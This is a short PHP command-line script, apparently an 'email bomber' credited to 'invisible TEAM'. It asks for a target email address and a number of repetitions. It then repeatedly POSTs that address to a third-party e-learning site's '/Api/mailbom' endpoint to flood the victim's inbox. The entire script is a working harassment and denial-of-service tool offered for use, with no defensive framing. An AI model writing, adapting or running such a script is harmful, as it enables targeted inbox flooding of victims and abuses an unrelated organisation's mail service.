<?php
echo "COPYRIGHT : invisible TEAM\n\n";
echo "Email Target?\nInput : ";
$nomer = trim(fgets(STDIN));

echo "Target: $nomer (y/n)";
$cek = trim(fgets(STDIN));
if($cek=="n") exit("Stopped!\n");
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
for($a=0;$a<$jumlah;$a++) {
$acak = rand(11111,99999);
	$ar = http_build_query(array(
				'email' => $nomer,
				'acak' => $acak
                             )
                           );
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://elearn.asdpalor.com/Api/mailbom");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
	$asw = curl_exec($ch);
	curl_close($ch);
	print $a.$nomer." [Sending]\n";
}
